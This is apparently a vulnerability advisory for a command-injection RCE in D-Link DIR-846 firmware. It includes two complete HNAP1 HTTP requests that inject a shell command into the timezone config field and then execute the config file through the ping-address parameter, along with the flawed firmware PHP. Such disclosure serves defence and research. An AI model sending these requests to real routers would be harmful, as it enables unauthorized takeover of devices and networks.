## D-Link DIR-846 RCE

### Description

The remote D-Link router is affected by a remote code execution vulnerability. D-Link DIR-846 v1.00A52 firmware was discovered to contain a remote command execution (RCE) vulnerability via the tomography_ping_address parameter in /HNAP1/ interface.

### Attack type

Remote

### Impact

Code Execution

### Affected component

D-Link DIR-846 v1.00A52 firmware

### Attack vector

Exploit the `SetNTPServerSettings`  interface to inject malicious command in the `/etc/config/system` file. 

```HTTP
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 78
Accept: application/json
DNT: 1
HNAP_AUTH: 6147C23206FF8CC1AB5CC13018BB3EA7 1680770210397
SOAPACTION: "http://purenetworks.com/HNAP1/SetNTPServerSettings"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.1
Referer: http://192.168.0.1/SNTP.html?t=1680770105995
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7
Cookie: PHPSESSID=b0dfed1882f1fe6eb8955ffd4b9a00c4; uid=XNecbwaw; PrivateKey=9C476884208EA69A1B7FBF06C721FFB7
Connection: close

{"SetNTPServerSettings":{"system_time_timezone":"'|`id > /tmp/result`|echo'"}}
```

![image-20230406172736707](https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202304061847427.png)

Exploit the `SetNetworkTomographySettings`  interface to execute `/etc/config/system` file.  

```HTTP
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 219
Accept: application/json
DNT: 1
HNAP_AUTH: 67A1E2B9863DEADEE016931DEC7A09BC 1680770287528
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.1
Referer: http://192.168.0.1/Diagnosis.html?t=1680770228118
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7
Cookie: PHPSESSID=b0dfed1882f1fe6eb8955ffd4b9a00c4; uid=5IOJOB9A; PrivateKey=8F7E2C71E8AC7E3D5245B1CE1910671A
Connection: close

{"SetNetworkTomographySettings":{"tomography_ping_address":"http://example.com/'&/etc/config/system&echo'1","tomography_ping_number":"1","tomography_ping_size":"4","tomography_ping_timeout":"","tomography_ping_ttl":""}}
```

![image-20230406172745213](https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202304061847898.png)

And the exploit was successfully.

![img-202304061847937](https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202304061847937.png)

### Additional information

The `system_time_timezone` parameter in `SetNTPServerSettings` interface allows us to input arbitrary words in corresponding config file.

```php
# control/SetNTPServerSettings.php 
class SetNTPServerSettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $option = $this->act_val;
        $system_info = read_cfg_info("system");
        $system_info = add_or_update_option_info($system_info, "system", "", "timezone", $option['system_time_timezone']); // input system_time_timezone parameter
        save_cfg_info("system", $system_info); // save file
        exec("/etc/init.d/system  restart");
        $result['SetNTPServerSettingsResult'] = "OK";
        $this->api_response(__CLASS__, $result);
    }
}
```

In this example, the `add_or_update_option_info()` function revises the old config file with the polluted `$value` parameter, and we can inject any malicious code via  `|` character.

```php
# core/fun/public.php
function add_or_update_option_info($cfg_str, $section_type, $section_name, $option_name, $value)
{
    if (empty($cfg_str)) {
        return $cfg_str;
    }
    if (empty($section_name)) {
        $section_begin = strpos($cfg_str, "config" . " " . $section_type);
    } else {
        //增加单引号处理
        $section_name = "'" . $section_name . "'\n";
        $section_begin = strpos($cfg_str, "config" . " " . $section_type . " " . $section_name);
    }

    $section_end = strpos($cfg_str, "\nconfig ", $section_begin);
    if (false === $section_end) {
        $section_str = substr($cfg_str, $section_begin);
    } else {
        $section_str = substr($cfg_str, $section_begin, $section_end - $section_begin);
    }

    //增加单引号处理
    $value = "'" . $value . "'";
    $has_option = strpos($section_str, "option" . " " . $option_name);
    if (false === $has_option) {
        $section_name_end = strpos($cfg_str, "\n", $section_begin);
        if (false === $section_name_end) {
            $str1 = $cfg_str;
            $str3 = NULL;
        } else {
            $str1 = substr($cfg_str, 0, $section_name_end);
            $str3 = substr($cfg_str, $section_name_end);
        }
        $str2 = "\n\t" . "option" . " " . $option_name . " " . $value;
    } else {
        $option_begin = strpos($cfg_str, "option" . " " . $option_name, $section_begin);
        $option_end = strpos($cfg_str, "\n", $option_begin);
        if (false === $option_end) {
            $str3 = NULL;
        } else {
            $str3 = substr($cfg_str, $option_end);
        }
        $str1 = substr($cfg_str, 0, $option_begin);
        $str2 = "option" . " " . $option_name . " " . $value;
    }
    return ($str1 . $str2 . $str3);
}
```

After replacing the option, the function will store the new configuration in cache file and config file. It should be noted that there are not `/tmp/mnt/config/` directory when using `QUME` to simulate the real environment, except you make it by yourself.

```php
# core/fun/public.php
function save_cfg_info($file_name, $cfg_str)
{
    if (empty($file_name)) {
        return false;
    }
    file_put_contents("/tmp/mnt/config/" . $file_name, $cfg_str); // save file in  /tmp/mnt/config/$file_name
    return file_put_contents("/etc/config/" . $file_name, $cfg_str); // save file in  /etc/config/$file_name
}
```

Here is an example of polluted `/etc/config/system` file.

``` 
config system
	option hostname rtkmips
	option timezone ''|`id > /tmp/result`|echo''

config timeserver 'ntp'
        list server '0.pool.ntp.org'
        list server '1.pool.ntp.org'
        list server '2.pool.ntp.org'
        list server '3.pool.ntp.org'
        list server '3.asia.pool.ntp.org'
        list server '0.asia.pool.ntp.org'
        list server '0.cn.pool.ntp.org'
        option enabled '1'
        option enable_server '0'

config led 'led_sys'
        option name 'SYSLED'
        option sysfs 'sysLED'
        option trigger 'default-on'

config led 'led_wps'
        option name 'WPSLED'
        option sysfs 'wpsLED'
```

In  `SetNetworkTomographySettings` interface, we can execute any file via the `tomography_ping_address`  parameter due to its inadequate filtration of the  `check_domain()` function.

```php
# control/SetNetworkTomographySettings.php
class SetNetworkTomographySettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //校验ping次数范围
            $result["message"] = "ping的次数不合法";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //校验ping包大小范围
            $result["message"] = "ping包大小不合法";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //校验是否为合法IP或域名
            || check_domain($option['tomography_ping_address']))) { // check_domain() function may be passed
            $result["message"] = "不是合法的IP或域名";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result"); // RCE
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
}
```

The `check_domain()` function allows us to inject `'` and `&` characters, which make us escape from the single quoted string in `SetNetworkTomographySettings` interface .

```php
# core/fun/public.php
function check_domain($domain)
{
    $reg = "/^(http(s?):\/\/){0,1}(?:[A-za-z0-9-]+\.)+[A-za-z]{2,4}(?:[\/\?#][\/=\?%\-&~`@[\]\':+!\.#\w]*)?$/";
    if (!preg_match($reg, $domain)) {
        return false;
    }
    return true;
}
```

### Credits

[Tyao](https://github.com/Tyaoo)、[0x14](https://github.com/Yof3ng)

### References

https://www.dlink.com.br/produto/roteador-dir-846-gigabit-wi-fi-ac1200/
